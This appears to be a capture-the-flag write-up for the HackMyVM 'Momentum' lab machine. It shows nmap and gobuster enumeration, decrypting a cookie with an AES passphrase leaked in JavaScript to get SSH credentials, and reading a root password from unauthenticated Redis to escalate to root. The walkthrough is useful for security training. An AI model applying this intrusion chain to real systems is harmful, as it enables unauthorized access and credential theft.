# Momentum - Author : Alienum 

# Netdiscory

```shell
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/momentum]
└─$ fping -ag 192.168.1.1/24 2>/dev/null
192.168.1.1
192.168.1.2
192.168.1.103
192.168.1.110
```

# Nmap
```bash
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/momentum]
└─$ nmap -A -sC -sV  -p-  192.168.1.110
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-20 07:53 EDT
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Nmap scan report for 192.168.1.110
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5c:8e:2c:cc:c1:b0:3e:7c:0e:22:34:d8:60:31:4e:62 (RSA)
|   256 81:fd:c6:4c:5a:50:0a:27:ea:83:38:64:b9:8b:bd:c1 (ECDSA)
|_  256 c1:8f:87:c1:52:09:27:60:5f:2e:2d:e0:08:03:72:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Momentum | Index 
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
```

# Gobuster 
```bash
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/momentum]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt   -u 'http://192.168.1.110/' -x php,txt,zip,bck,html,bak
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.110/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,bak,php,txt,zip,bck
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 2001]
/.html                (Status: 403) [Size: 278]
/img                  (Status: 301) [Size: 312] [--> http://192.168.1.110/img/]
/.php                 (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://192.168.1.110/css/]
/manual               (Status: 301) [Size: 315] [--> http://192.168.1.110/manual/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.1.110/js/]

```

```bash
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/momentum]
└─$ curl 'http://192.168.1.110/js/main.js'
function viewDetails(str) {

  window.location.href = "opus-details.php?id="+str;
}

/*
var CryptoJS = require("crypto-js");
var decrypted = CryptoJS.AES.decrypt(encrypted, "SecretPassphraseMomentum");
console.log(decrypted.toString(CryptoJS.enc.Utf8));
*/
```
```
Found a new php file but didnt give too much ...
i tried to fuzz but nothing ...
```
# Priv Esc to User
```
cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt
Key = SecretPassphraseMomentum

decoded = auxerre-alienum##
```
# ssh - user 
```bash
┌──(kali💀kali)-[~/Documents/CTF/hackmyvm/momentum]
└─$ ssh auxerre@192.168.1.110 #password = auxurre-alienum##
auxerre@192.168.1.110's password: 
Linux Momentum 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May 20 06:38:43 2024 from 192.168.1.103
auxerre@Momentum:~$ 
```
# Priv Esc - ROOT 

```bash 
auxerre@Momentum:~$ ss -tuln
Netid   State    Recv-Q   Send-Q      Local Address:Port       Peer Address:Port   
udp     UNCONN   0        0                 0.0.0.0:68              0.0.0.0:*      
tcp     LISTEN   0        128             127.0.0.1:6379            0.0.0.0:*      
tcp     LISTEN   0        128               0.0.0.0:22              0.0.0.0:*      
tcp     LISTEN   0        128                 [::1]:6379               [::]:*      
tcp     LISTEN   0        128                     *:80                    *:*      
tcp     LISTEN   0        128                  [::]:22                 [::]:* 
```
```
By default, the Redis server runs on TCP Port 6379.
i learned some redis-cli commands on chatgpt
```

```bash
auxerre@Momentum:~$ redis-cli 
127.0.0.1:6379> KEYS *
1) "rootpass"
127.0.0.1:6379> get "rootpass"
"ROOTPASSWORDHERE"
127.0.0.1:6379> exit
auxerre@Momentum:~$ su root
Password: 
root@Momentum:/home/auxerre# id
uid=0(root) gid=0(root) groups=0(root)
```